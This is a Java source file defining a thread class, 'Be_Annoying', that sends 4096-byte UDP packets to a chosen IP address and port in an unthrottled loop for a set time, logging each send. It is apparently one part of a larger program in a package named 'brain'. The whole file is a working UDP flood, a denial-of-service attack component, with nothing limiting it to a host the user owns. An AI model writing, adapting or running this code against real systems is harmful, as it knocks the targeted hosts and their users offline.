package brain;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.SocketException;

public class Be_Annoying extends Thread {

    int Port;
    String Ip;
    int totalTime;
    long threadId;

    Be_Annoying(String ip, int port, int totaltime) {
        this.Ip = ip;
        this.Port = port;
        this.totalTime = totaltime;
    }

    @Override
    public void run() {
        try {
            threadId = Thread.currentThread().getId();
            long startTime = System.currentTimeMillis();
            boolean toFinish = false;
            DatagramSocket socket = null;
            byte[] data = new byte[4096];
            socket = new DatagramSocket();
            socket.setSoTimeout(100);
            socket.setTrafficClass(0x02 | 0x04 | 0x08 | 0x10);
            while (!toFinish) {
                socket.connect(new InetSocketAddress(Ip, Port));
                socket.send(new DatagramPacket(data, data.length));
                System.out.println("Thread " + threadId + " being annoying in port:" + Port + " from ip:" + Ip + " for: " + totalTime);
                toFinish = (System.currentTimeMillis() - startTime >= totalTime);

            }
            socket.close();
        } catch (SocketException ex) {
            System.err.println("Fail being annoying on socket");
        } catch (IOException ex) {
            System.err.println("Fail being annoying ");
        }
    }
}
